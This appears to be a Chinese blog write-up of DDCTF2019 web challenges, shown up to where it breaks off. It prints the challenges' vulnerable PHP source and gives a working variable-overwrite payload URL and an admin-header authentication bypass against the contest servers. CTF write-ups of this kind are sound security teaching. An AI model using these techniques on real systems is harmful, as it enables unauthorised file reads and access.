<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>DDCTF2019 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.png"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">DDCTF2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-21</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ctf"> ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="DDCTF2019"><a href="#DDCTF2019" class="headerlink" title="DDCTF2019"></a>DDCTF2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>还是要有耐心啊，这次做题由于感觉像吃了屎一样，所以索性就没做了，并且精力有限。</p>
<p>这题打开链接，给出了一张图片（这图成功成为了又一个表情包）<br><img src="https://i.imgur.com/wN3YSTR.jpg" alt=""><br>注意地址栏，参数<strong>jpg</strong>后面跟了一串字符串，猜测base64，经过一番尝试，发现编码规则是将源文件名转为hex，再进行两次base64编码，于是尝试读取源码</p>
<p>利用python进行编码：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(<span class="name">base64</span>.b64encode(<span class="name">base64</span>.b64encode(('index.php'.encode('ascii')).hex().encode('utf-8'))),'utf-8')</span><br></pre></td></tr></table></figure></p>
<p>拿到源码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span></span><br><span class="line"><span class="php">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span></span><br><span class="line"><span class="php">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$txt = base64_encode(file_get_contents($file));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>注释中有一个博客地址，进入博客，查看历史文章，在这篇文章：<br><a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a><br>找到一个：<strong>.practice.txt.swp</strong>，尝试将其作为一个文件粘贴入地址栏，得到了：<strong>f1ag!ddctf.php</strong><br>猜测flag就在这，但注意到源码中将<strong>config</strong>置换为<strong>!</strong>，且直接输入<strong>f1ag!ddctf.php</strong>会将<strong>!</strong>换为空字符，于是有了如下代码：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(<span class="name">base64</span>.b64encode(<span class="name">base64</span>.b64encode(('f1agconfigddctf.php'.encode('ascii')).hex().encode('utf-8'))),'utf-8')</span><br></pre></td></tr></table></figure>
<p>得到源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span></span><br><span class="line"><span class="php">$k = <span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content=trim(file_get_contents($k));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($uid==$content)</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p><strong>变量覆盖漏洞</strong><br>trim()</p>
<blockquote>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
</blockquote>
<p>extract()</p>
<blockquote>
<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
</blockquote>
<p>paylaod:<code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1</code><br><strong>DDCTF{436f6e67726174756c6174696f6e73}</strong></p>
<h3 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h3><p>进入链接后，注意到一行大字：<br><strong>抱歉，您没有登陆权限，请获取权限后访问—–</strong><br>查看源码，注意到<code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code>，查看源码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以思路比较清楚，向<code>http://117.51.158.44/app/Auth.php</code>发送认证，于是添加header：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">didictf_username:</span> admin</span><br></pre></td></tr></table></figure></p>
<p>得到如下提示：<br><strong>您当前当前权限为管理员—-请访问:app/fL2XID2i0Cdh.php</strong><br>访问<br><strong>app/Application.php</strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Class Application &#123;</span><br><span class="line">    var <span class="variable">$path</span> = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> response(<span class="variable">$data</span>, <span class="variable">$errMsg</span> = <span class="string">'success'</span>) &#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">'errMsg'</span> =&gt; <span class="variable">$errMsg</span>,</span><br><span class="line">            <span class="string">'data'</span> =&gt; <span class="variable">$data</span>];</span><br><span class="line">        <span class="variable">$ret</span> = json_encode(<span class="variable">$ret</span>);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        echo <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> auth() &#123;</span><br><span class="line">        <span class="variable">$DIDICTF_ADMIN</span> = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!empty(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == <span class="variable">$DIDICTF_ADMIN</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            return TRUE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> sanitizepath(<span class="variable">$path</span>) &#123;</span><br><span class="line">    <span class="variable">$path</span> = trim(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,<span class="variable">$path</span>);</span><br><span class="line">    return <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> __destruct() &#123;</span><br><span class="line">    <span class="keyword">if</span>(empty(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$this</span>-&gt;sanitizepath(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$path</span>) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;response(<span class="variable">$data</span>=file_get_contents(<span class="variable">$path</span>),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>app/Session.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p>
<p>用burpsuite查看请求与响应情况：<br><strong>request:</strong></p>
<blockquote>
